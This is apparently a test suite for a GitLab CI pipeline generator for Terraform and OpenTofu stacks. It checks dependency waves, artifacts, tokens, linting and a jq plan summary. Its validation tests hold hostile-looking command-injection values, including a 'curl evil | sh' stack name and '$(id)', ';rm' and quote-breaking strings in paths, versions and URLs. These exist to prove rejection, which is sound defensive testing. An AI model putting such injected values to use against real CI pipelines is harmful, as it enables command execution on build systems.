import { afterAll, afterEach, beforeAll, describe, expect, test } from "bun:test";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createGitlab } from "@orch/gitlab";
import { createMockGitlab } from "@orch/gitlab/mock";
import { parse } from "yaml";
import {
  type ApplyInput,
  GenerateError,
  generatePipeline,
  type PlanInput,
  SUMMARY_FILTER,
} from "./pipeline-gen";
import type { Stack } from "./scan";

const stack = (name: string, over: Partial<Stack> = {}): Stack => ({
  name,
  path: `stacks/${name}`,
  tool: "terraform",
  version: "1.9.8",
  tags: [],
  dependsOn: [],
  watch: [],
  applyOn: "command",
  backend: "http",
  ...over,
});

// net <- db <- app, net <- queue; tofu for queue
const STACKS = [
  stack("app", { dependsOn: ["db"] }),
  stack("db", { dependsOn: ["net"] }),
  stack("net"),
  stack("queue", { dependsOn: ["net"], tool: "tofu", version: "1.8.2" }),
];

const plan = (over: Partial<PlanInput> = {}): PlanInput => ({
  action: "plan",
  stacks: STACKS,
  select: ["app", "db", "net", "queue"],
  audience: "orch.example.com",
  apiUrl: "https://orch.example.com",
  summaryPath: "/runs/0b9e5bd2/plan-summary",
  helperImage: "registry.example.com/orch/ci-helper:1.0.0",
  ...over,
});

const apply = (over: Partial<ApplyInput> = {}): ApplyInput => ({
  action: "apply",
  stacks: STACKS,
  select: ["app", "db", "net", "queue"],
  planJobs: { app: 104, db: 103, net: 101, queue: 102 },
  ...over,
});

// biome-ignore lint/suspicious/noExplicitAny: a job read back from YAML, looked into loosely by the tests
type Job = Record<string, any>;
const jobsOf = (yaml: string): Record<string, Job> => {
  const { stages: _, ...jobs } = parse(yaml);
  return jobs;
};
const stagesOf = (yaml: string): string[] => parse(yaml).stages;
const needsOf = (job: Job): string[] => job.needs.map((n: { job: string }) => n.job);

const failure = (fn: () => unknown): GenerateError => {
  try {
    fn();
  } catch (e) {
    if (e instanceof GenerateError) return e;
    throw e;
  }
  throw new Error("it did not throw");
};

describe("a plan pipeline", () => {
  test("snapshot", () => {
    expect(generatePipeline(plan())).toMatchSnapshot();
  });

  test("one stage per wave, then the summaries", () => {
    const yaml = generatePipeline(plan());
    expect(stagesOf(yaml)).toEqual(["wave-0", "wave-1", "wave-2", "summary"]);
    const jobs = jobsOf(yaml);
    expect(Object.keys(jobs).sort()).toEqual([
      "plan:app",
      "plan:db",
      "plan:net",
      "plan:queue",
      "summary:app",
      "summary:db",
      "summary:net",
      "summary:queue",
    ]);
    expect(jobs["plan:net"]?.stage).toBe("wave-0");
    expect(jobs["plan:db"]?.stage).toBe("wave-1");
    expect(jobs["plan:queue"]?.stage).toBe("wave-1");
    expect(jobs["plan:app"]?.stage).toBe("wave-2");
    expect(jobs["summary:app"]?.stage).toBe("summary");
  });

  test("a stack needs the stacks it depends on and no one else; the first wave needs nothing", () => {
    const jobs = jobsOf(generatePipeline(plan()));
    expect(jobs["plan:net"]?.needs).toEqual([]);
    expect(needsOf(jobs["plan:db"] as Job)).toEqual(["plan:net"]);
    expect(needsOf(jobs["plan:queue"] as Job)).toEqual(["plan:net"]);
    expect(needsOf(jobs["plan:app"] as Job)).toEqual(["plan:db"]);
  });

  test("a job does not download the artifacts of the jobs it waits for; a summary downloads its plan", () => {
    const jobs = jobsOf(generatePipeline(plan()));
    expect(jobs["plan:db"]?.needs).toEqual([{ job: "plan:net", artifacts: false }]);
    expect(jobs["summary:db"]?.needs).toEqual([{ job: "plan:db", artifacts: true }]);
  });

  test("the plan is saved as an artifact in the stack's directory, and expires", () => {
    const job = jobsOf(generatePipeline(plan()))["plan:db"] as Job;
    expect(job.artifacts).toEqual({
      paths: ["stacks/db/plan.tfplan", "stacks/db/plan.json"],
      expire_in: "1 week",
      access: "developer",
    });
    expect(job.script).toEqual([
      "cd stacks/db",
      "terraform init -input=false",
      "terraform plan -input=false -lock-timeout=5m -out=plan.tfplan",
      "terraform show -json plan.tfplan > plan.json",
    ]);
  });

  test("a stack at the root of the repository needs no cd and has bare artifact paths", () => {
    const jobs = jobsOf(
      generatePipeline(plan({ stacks: [stack("root", { path: "." })], select: ["root"] })),
    );
    expect(jobs["plan:root"]?.script[0]).toBe("terraform init -input=false");
    expect(jobs["plan:root"]?.artifacts.paths).toEqual(["plan.tfplan", "plan.json"]);
  });

  test("every stack has its own resource group, and a plan can be cancelled by a newer push", () => {
    const jobs = jobsOf(generatePipeline(plan()));
    for (const name of ["app", "db", "net", "queue"]) {
      expect(jobs[`plan:${name}`]?.resource_group).toBe(`stack-${name}`);
      expect(jobs[`plan:${name}`]?.interruptible).toBe(true);
    }
  });

  test("the tool is set up by its version: the image tag", () => {
    const jobs = jobsOf(generatePipeline(plan()));
    expect(jobs["plan:net"]?.image).toEqual({
      name: "hashicorp/terraform:1.9.8",
      entrypoint: [""],
    });
    expect(jobs["plan:queue"]?.image).toEqual({
      name: "ghcr.io/opentofu/opentofu:1.8.2",
      entrypoint: [""],
    });
    expect(jobs["plan:queue"]?.script).toContain("tofu init -input=false");
  });

  test("only the summary job holds the platform's id_token; the tool jobs hold none unless the cloud needs one", () => {
    const jobs = jobsOf(generatePipeline(plan()));
    expect(jobs["summary:db"]?.id_tokens).toEqual({ ORCH_ID_TOKEN: { aud: "orch.example.com" } });
    for (const [name, job] of Object.entries(jobs)) {
      if (name.startsWith("plan:")) expect(job.id_tokens).toBeUndefined();
    }
    const cloud = jobsOf(
      generatePipeline(
        plan({ cloudTokens: { GCP_ID_TOKEN: "https://iam.example/gcp", AWS: "sts" } }),
      ),
    );
    expect(cloud["plan:db"]?.id_tokens).toEqual({
      AWS: { aud: "sts" },
      GCP_ID_TOKEN: { aud: "https://iam.example/gcp" },
    });
    expect(cloud["summary:db"]?.id_tokens).toEqual({ ORCH_ID_TOKEN: { aud: "orch.example.com" } });
  });

  test("the summary job signs in, summarises the plan with the counts only, and posts it", () => {
    const job = jobsOf(generatePipeline(plan()))["summary:db"] as Job;
    expect(job.image).toEqual({
      name: "registry.example.com/orch/ci-helper:1.0.0",
      entrypoint: [""],
    });
    expect(job.variables).toEqual({ ORCH_API_URL: "https://orch.example.com" });
    expect(job.script).toEqual([
      'login="$(orch ci login)"',
      'eval "$login"',
      `jq -c --arg stack db '${SUMMARY_FILTER}' stacks/db/plan.json > summary.json`,
      'curl --fail --silent --show-error --request POST --header "Authorization: Bearer $ORCH_TOKEN" --header "Content-Type: application/json" --data @summary.json "$ORCH_API_URL/runs/0b9e5bd2/plan-summary"',
    ]);
  });

  test("a stack outside the selection is left out, and a dependency through it is still waited for", () => {
    // app -> db -> net, with db not selected
    const jobs = jobsOf(generatePipeline(plan({ select: ["app", "net"] })));
    expect(Object.keys(jobs).sort()).toEqual([
      "plan:app",
      "plan:net",
      "summary:app",
      "summary:net",
    ]);
    expect(needsOf(jobs["plan:app"] as Job)).toEqual(["plan:net"]);
    expect(jobs["plan:app"]?.stage).toBe("wave-1");
  });

  test("a single stack is one wave with nothing to wait for", () => {
    const yaml = generatePipeline(plan({ select: ["app"] }));
    expect(stagesOf(yaml)).toEqual(["wave-0", "summary"]);
    expect(jobsOf(yaml)["plan:app"]?.needs).toEqual([]);
  });
});

describe("an apply pipeline", () => {
  test("snapshot", () => {
    expect(generatePipeline(apply())).toMatchSnapshot();
  });

  test("applies in dependency order, from the plan saved by the plan job", () => {
    const yaml = generatePipeline(apply());
    expect(stagesOf(yaml)).toEqual(["wave-0", "wave-1", "wave-2"]);
    const jobs = jobsOf(yaml);
    expect(Object.keys(jobs).sort()).toEqual(["apply:app", "apply:db", "apply:net", "apply:queue"]);
    expect(jobs["apply:db"]?.needs).toEqual([{ job: "apply:net", artifacts: false }]);
    expect(jobs["apply:net"]?.needs).toEqual([]);
    expect(jobs["apply:db"]?.script).toEqual([
      "cd stacks/db",
      'wget -q --header "JOB-TOKEN: $CI_JOB_TOKEN" -O plan.tfplan "$CI_API_V4_URL/projects/$CI_PROJECT_ID/jobs/103/artifacts/stacks/db/plan.tfplan"',
      "terraform init -input=false",
      "terraform apply -input=false -lock-timeout=5m plan.tfplan",
    ]);
  });

  test("an apply is in the stack's resource group and is never interrupted", () => {
    const jobs = jobsOf(generatePipeline(apply()));
    for (const name of ["app", "db", "net", "queue"]) {
      expect(jobs[`apply:${name}`]?.resource_group).toBe(`stack-${name}`);
      expect(jobs[`apply:${name}`]?.interruptible).toBeUndefined();
    }
  });

  test("no job holds the platform's id_token, and the cloud's is passed on", () => {
    const jobs = jobsOf(generatePipeline(apply({ cloudTokens: { AWS_ID_TOKEN: "sts" } })));
    for (const job of Object.values(jobs)) {
      expect(job.id_tokens).toEqual({ AWS_ID_TOKEN: { aud: "sts" } });
    }
  });

  test("a stack with no saved plan is refused, whatever else was given", () => {
    const e = failure(() => generatePipeline(apply({ planJobs: { app: 1, db: 2, net: 3 } })));
    expect(e.problems).toEqual(['stack "queue" has no saved plan to apply']);
    for (const bad of [0, -1, 1.5, Number.NaN, 2 ** 60]) {
      expect(() =>
        generatePipeline(apply({ planJobs: { app: 1, db: 2, net: 3, queue: bad } })),
      ).toThrow(GenerateError);
    }
  });
});

describe("the output is a pipeline GitLab accepts", () => {
  const stops: Array<() => void> = [];
  afterEach(() => {
    for (const stop of stops.splice(0)) stop();
  });

  test("lint accepts a plan pipeline and an apply pipeline, with and without cloud tokens", async () => {
    const mock = createMockGitlab();
    stops.push(() => mock.stop());
    const project = mock.addProject({ path: "acme/infra", defaultBranch: "main", files: {} });
    const gitlab = createGitlab({
      baseUrl: mock.url,
      auth: { type: "private-token", token: mock.token },
      maxRetries: 0,
    });
    for (const yaml of [
      generatePipeline(plan()),
      generatePipeline(plan({ cloudTokens: { AWS_ID_TOKEN: "sts" } })),
      generatePipeline(apply()),
      generatePipeline(apply({ select: ["net"] })),
    ]) {
      expect(await gitlab.ci.lint(project.id, yaml)).toMatchObject({ valid: true, errors: [] });
    }
  });

  test("the lint would reject a pipeline whose jobs have no script (it is checking something)", async () => {
    const mock = createMockGitlab();
    stops.push(() => mock.stop());
    const project = mock.addProject({ path: "acme/infra", defaultBranch: "main", files: {} });
    const gitlab = createGitlab({
      baseUrl: mock.url,
      auth: { type: "private-token", token: mock.token },
      maxRetries: 0,
    });
    const broken = generatePipeline(plan()).replaceAll("script:", "scrip:");
    expect((await gitlab.ci.lint(project.id, broken)).valid).toBe(false);
  });
});

describe("generation fails loudly", () => {
  test("on a cycle, naming the stacks in it", () => {
    const e = failure(() =>
      generatePipeline(
        plan({
          stacks: [stack("a", { dependsOn: ["b"] }), stack("b", { dependsOn: ["a"] })],
          select: ["a"],
        }),
      ),
    );
    expect(e.problems).toHaveLength(1);
    expect(e.message).toContain("a -> b -> a");
  });

  test("on a cycle among stacks that are not selected", () => {
    expect(() =>
      generatePipeline(
        plan({
          stacks: [stack("ok"), stack("a", { dependsOn: ["b"] }), stack("b", { dependsOn: ["a"] })],
          select: ["ok"],
        }),
      ),
    ).toThrow(/cycle/);
  });

  test("on a dependency that is not a stack (one that failed to scan)", () => {
    const e = failure(() =>
      generatePipeline(plan({ stacks: [stack("a", { dependsOn: ["gone"] })], select: ["a"] })),
    );
    expect(e.message).toContain("gone");
  });

  test("on a missing tool version, for every stack that has none", () => {
    const e = failure(() =>
      generatePipeline(
        plan({
          stacks: [stack("a", { version: null }), stack("b", { version: null }), stack("c")],
          select: ["c", "b", "a"],
        }),
      ),
    );
    expect(e.problems).toEqual([
      'stack "a" has no version: set version in its stack.yml',
      'stack "b" has no version: set version in its stack.yml',
    ]);
  });

  test("on terragrunt, which has no default image, until one is given", () => {
    const stacks = [stack("a", { tool: "terragrunt", version: "0.67.0" })];
    const e = failure(() => generatePipeline(plan({ stacks, select: ["a"] })));
    expect(e.problems).toEqual([
      'stack "a" uses terragrunt, which needs an image: pass images.terragrunt',
    ]);
    const jobs = jobsOf(
      generatePipeline(
        plan({ stacks, select: ["a"], images: { terragrunt: "registry.example.com/tg" } }),
      ),
    );
    expect(jobs["plan:a"]?.image.name).toBe("registry.example.com/tg:0.67.0");
    expect(jobs["plan:a"]?.script).toContain("terragrunt init -input=false");
  });

  test("on a stack that is not there, an empty selection and a selection of nothing but repeats", () => {
    expect(failure(() => generatePipeline(plan({ select: ["nope"] }))).problems).toEqual([
      'unknown stack "nope"',
    ]);
    expect(failure(() => generatePipeline(plan({ select: [] }))).problems).toEqual([
      "no stack was selected",
    ]);
    // a repeated name is one job, not two
    const once = generatePipeline(plan({ select: ["net", "net"] }));
    expect(Object.keys(jobsOf(once)).sort()).toEqual(["plan:net", "summary:net"]);
    expect(once).toStartWith("# Generated by orch: a child pipeline for plan of 1 stack. ");
  });

  test("an unknown name is shown quoted and cut short, as it may be what a user typed", () => {
    const [problem] = failure(() =>
      generatePipeline(plan({ select: [`x\n- run: curl evil | sh ${"y".repeat(500)}`] })),
    ).problems;
    expect(problem).toStartWith('unknown stack "x\\n- run');
    expect(problem?.length).toBeLessThan(120);
  });

  test("on a stack that would wait for more jobs than GitLab allows, looking through stacks that are not selected", () => {
    // `top` depends on `mids` stacks that are not selected, each on a selected one
    const fixture = (mids: number) => {
      const leaves = Array.from({ length: mids }, (_, i) => stack(`leaf${i}`));
      const middle = Array.from({ length: mids }, (_, i) =>
        stack(`mid${i}`, { dependsOn: [`leaf${i}`] }),
      );
      const top = stack("top", { dependsOn: middle.map((m) => m.name) });
      return plan({
        stacks: [...leaves, ...middle, top],
        select: [...leaves.map((l) => l.name), "top"],
      });
    };
    expect(needsOf(jobsOf(generatePipeline(fixture(50)))["plan:top"] as Job)).toHaveLength(50);
    const e = failure(() => generatePipeline(fixture(51)));
    expect(e.problems).toEqual([
      'stack "top" would wait for 51 stacks; GitLab allows 50 needs per job',
    ]);
  });

  test("on a name, path or version that could reach a shell or break a job name", () => {
    const hostile = [
      stack("a b"),
      stack("a$(id)"),
      stack("A"),
      stack("ok", { path: "stacks/a b" }),
      stack("ok", { path: "stacks/$(id)" }),
      stack("ok", { path: "../up" }),
      stack("ok", { path: "stacks/a;rm" }),
      stack("ok", { path: "-rf" }),
      stack("ok", { path: "stacks/\nx" }),
      stack("ok", { version: "1.9.8; id" }),
      stack("ok", { version: "latest" }),
      stack("ok", { version: "1.9.8\n" }),
    ];
    for (const s of hostile) {
      expect(() => generatePipeline(plan({ stacks: [s], select: [s.name] }))).toThrow(
        GenerateError,
      );
    }
  });

  test("on options that could reach a shell or a job's configuration", () => {
    const bad: Array<Partial<PlanInput>> = [
      { audience: "" },
      { audience: "has space" },
      { audience: "a\nb" },
      { audience: "x".repeat(300) },
      { apiUrl: "ftp://orch.example.com" },
      { apiUrl: "https://orch.example.com/" },
      { apiUrl: 'https://orch.example.com"; id; "' },
      { apiUrl: "https://orch.example.com/$(id)" },
      { apiUrl: "https://user:pw@orch.example.com" },
      { summaryPath: "runs/1/plan-summary" },
      { summaryPath: '/runs/1"; id; "' },
      { summaryPath: "/runs/$HOME" },
      { summaryPath: "/runs/ 1" },
      { summaryPath: "/runs/../x" },
      { helperImage: "" },
      { helperImage: "img; id" },
      { helperImage: "Img:1" },
      { helperImage: "img:1\nx" },
      { cloudTokens: { "bad name": "a" } },
      { cloudTokens: { ORCH_ID_TOKEN: "a" } },
      { cloudTokens: { ORCH_X: "a" } },
      { cloudTokens: { OK: "has space" } },
      { cloudTokens: { OK: "" } },
      { images: { terraform: "img; id" } },
      { images: { terraform: "img:1.0" } },
      { images: { terraform: "Img" } },
    ];
    for (const over of bad) {
      expect(() => generatePipeline(plan(over)), JSON.stringify(over)).toThrow(GenerateError);
    }
    // the same options are fine in their normal form
    expect(() =>
      generatePipeline(
        plan({
          apiUrl: "http://localhost:3000",
          helperImage: "registry.example.com:5000/orch/helper:1.0.0",
        }),
      ),
    ).not.toThrow();
    const overridden = generatePipeline(
      plan({ images: { terraform: "localhost:5000/hashi/terraform" } }),
    );
    expect(jobsOf(overridden)["plan:net"]?.image.name).toBe("localhost:5000/hashi/terraform:1.9.8");
    expect(() => generatePipeline(apply({ cloudTokens: { "bad name": "a" } }))).toThrow(
      GenerateError,
    );
  });

  test("with every problem found at once, not the first", () => {
    const e = failure(() =>
      generatePipeline(
        plan({
          stacks: [stack("a", { version: null }), stack("b", { path: "a b" })],
          select: ["a", "b", "c"],
          audience: "",
        }),
      ),
    );
    expect(e.problems).toHaveLength(4);
    expect(e.message).toStartWith("cannot generate the pipeline: ");
  });
});

test("the pipeline is the same whatever order the stacks and the selection come in", () => {
  const a = generatePipeline(plan());
  const b = generatePipeline(
    plan({ stacks: [...STACKS].reverse(), select: ["queue", "net", "db", "app"] }),
  );
  expect(b).toBe(a);
});

test("the only variables a job reads are the ones GitLab and the platform set, and no secret is written in it", () => {
  const allowed = new Set([
    "CI_JOB_TOKEN",
    "CI_API_V4_URL",
    "CI_PROJECT_ID",
    "ORCH_TOKEN",
    "ORCH_API_URL",
    "login",
    "orch",
    "stack",
    "c",
  ]);
  for (const yaml of [
    generatePipeline(plan({ cloudTokens: { AWS_ID_TOKEN: "sts" } })),
    generatePipeline(apply({ cloudTokens: { AWS_ID_TOKEN: "sts" } })),
  ]) {
    const used = new Set(
      Array.from(yaml.matchAll(/\$\(?\{?([A-Za-z_][A-Za-z0-9_]*)/g), (m) => m[1]),
    );
    for (const name of used) expect(allowed.has(name ?? ""), name).toBe(true);
    expect(yaml).not.toMatch(/eyJ[A-Za-z0-9_-]{10,}/); // no JWT
    expect(yaml).not.toMatch(/Bearer [^$]/);
  }
});

describe("many graphs", () => {
  // a small seeded generator, so a failure is the same failure next time
  const rng = (seed: number) => () => {
    seed = (seed * 1664525 + 1013904223) % 2 ** 32;
    return seed / 2 ** 32;
  };

  test("a job waits for everything it depends on that is selected, and only for earlier stages", () => {
    for (let seed = 1; seed <= 150; seed++) {
      const r = rng(seed);
      const n = 1 + Math.floor(r() * 9);
      const names = Array.from({ length: n }, (_, i) => `s${i}`);
      // an edge only goes to a lower number, so the graph has no cycle
      const stacks = names.map((name, i) =>
        stack(name, { dependsOn: names.slice(0, i).filter(() => r() < 0.35) }),
      );
      const select = names.filter(() => r() < 0.6);
      if (select.length === 0) select.push("s0");
      const kind = r() < 0.5 ? "plan" : "apply";
      const yaml = generatePipeline(
        kind === "plan"
          ? plan({ stacks, select })
          : apply({
              stacks,
              select,
              planJobs: Object.fromEntries(names.map((x, i) => [x, i + 1])),
            }),
      );
      const jobs = jobsOf(yaml);
      const stages = stagesOf(yaml);
      const jobOf = (name: string) => jobs[`${kind}:${name}`] as Job;

      // the oracle: what each stack depends on, through any stacks, among the selected
      const direct = new Map(stacks.map((s) => [s.name, s.dependsOn]));
      const ancestors = (name: string, seen = new Set<string>()): Set<string> => {
        for (const d of direct.get(name) ?? []) {
          if (!seen.has(d)) {
            seen.add(d);
            ancestors(d, seen);
          }
        }
        return seen;
      };
      // what a job waits for through its `needs`, to any depth
      const waitsFor = (name: string, seen = new Set<string>()): Set<string> => {
        for (const need of needsOf(jobOf(name))) {
          const dep = need.slice(kind.length + 1);
          if (!seen.has(dep)) {
            seen.add(dep);
            waitsFor(dep, seen);
          }
        }
        return seen;
      };
      for (const name of select) {
        const want = [...ancestors(name)].filter((a) => select.includes(a)).sort();
        expect([...waitsFor(name)].sort(), `seed ${seed} ${name}`).toEqual(want);
        for (const need of needsOf(jobOf(name))) {
          expect(select).toContain(need.slice(kind.length + 1));
          const earlier = stages.indexOf(jobs[need]?.stage) < stages.indexOf(jobOf(name).stage);
          expect(earlier, `seed ${seed} ${name} needs ${need}`).toBe(true);
        }
      }
      expect(Object.keys(jobs).filter((j) => j.startsWith(`${kind}:`))).toHaveLength(select.length);
    }
  });
});

describe("the plan summary filter", () => {
  const jq = Bun.which("jq");
  const run = async (input: unknown) => {
    const proc = Bun.spawn([jq as string, "-c", "--arg", "stack", "db", SUMMARY_FILTER], {
      stdin: new TextEncoder().encode(JSON.stringify(input)),
      stdout: "pipe",
      stderr: "pipe",
    });
    const [out, err] = await Promise.all([
      new Response(proc.stdout).text(),
      new Response(proc.stderr).text(),
    ]);
    expect(await proc.exited, err).toBe(0);
    return JSON.parse(out);
  };
  const change = (address: string, actions: string[]) => ({
    address,
    type: "x",
    change: {
      actions,
      before: { password: "hunter2-before" },
      after: { password: "hunter2-after" },
      after_sensitive: { password: true },
    },
  });

  // jq is a dev tool, not a dependency: without it the filter is checked by the pipeline's own run
  test.skipIf(!jq)(
    "counts what terraform counts, lists addresses and actions, and leaves values out",
    async () => {
      const summary = await run({
        format_version: "1.2",
        resource_changes: [
          change("aws_a.one", ["create"]),
          change("aws_a.two", ["create"]),
          change("aws_b.one", ["update"]),
          change("aws_c.one", ["delete"]),
          change("aws_d.one", ["delete", "create"]),
          change("aws_e.one", ["create", "delete"]),
          change("aws_f.one", ["no-op"]),
          change("data.aws_g.one", ["read"]),
        ],
        planned_values: { root_module: { resources: [{ values: { password: "hunter2" } }] } },
      });
      expect(summary).toEqual({
        stack: "db",
        add: 4,
        change: 1,
        destroy: 3,
        resources: [
          { address: "aws_a.one", actions: ["create"] },
          { address: "aws_a.two", actions: ["create"] },
          { address: "aws_b.one", actions: ["update"] },
          { address: "aws_c.one", actions: ["delete"] },
          { address: "aws_d.one", actions: ["delete", "create"] },
          { address: "aws_e.one", actions: ["create", "delete"] },
        ],
      });
      expect(JSON.stringify(summary)).not.toContain("hunter2");
    },
  );

  test.skipIf(!jq)(
    "a plan with no changes has no resource_changes at all, and that is zero",
    async () => {
      expect(await run({ format_version: "1.2" })).toEqual({
        stack: "db",
        add: 0,
        change: 0,
        destroy: 0,
        resources: [],
      });
    },
  );

  describe("as the job runs it", () => {
    let dir: string;
    beforeAll(async () => {
      dir = await mkdtemp(join(tmpdir(), "orch-summary-"));
    });
    afterAll(async () => {
      await rm(dir, { recursive: true, force: true });
    });

    // the generated line goes through a real shell, so its quoting is what is tested
    test.skipIf(!jq)(
      "the generated jq line, run by sh, writes the summary of the stack's plan",
      async () => {
        const line = (jobsOf(generatePipeline(plan()))["summary:db"] as Job).script[2] as string;
        await mkdir(join(dir, "stacks/db"), { recursive: true });
        await writeFile(
          join(dir, "stacks/db/plan.json"),
          JSON.stringify({
            resource_changes: [change("aws_a.one", ["create"]), change("aws_b.one", ["delete"])],
          }),
        );
        const proc = Bun.spawn(["sh", "-c", line], { cwd: dir, stderr: "pipe" });
        expect(await proc.exited, await new Response(proc.stderr).text()).toBe(0);
        expect(JSON.parse(await readFile(join(dir, "summary.json"), "utf8"))).toEqual({
          stack: "db",
          add: 1,
          change: 0,
          destroy: 1,
          resources: [
            { address: "aws_a.one", actions: ["create"] },
            { address: "aws_b.one", actions: ["delete"] },
          ],
        });
      },
    );
  });

  test.skipIf(!jq)("the list is cut at 500 resources while the counts stay whole", async () => {
    const many = Array.from({ length: 700 }, (_, i) => change(`aws_a.n${i}`, ["create"]));
    const summary = await run({ resource_changes: many });
    expect(summary.add).toBe(700);
    expect(summary.resources).toHaveLength(500);
  });
});
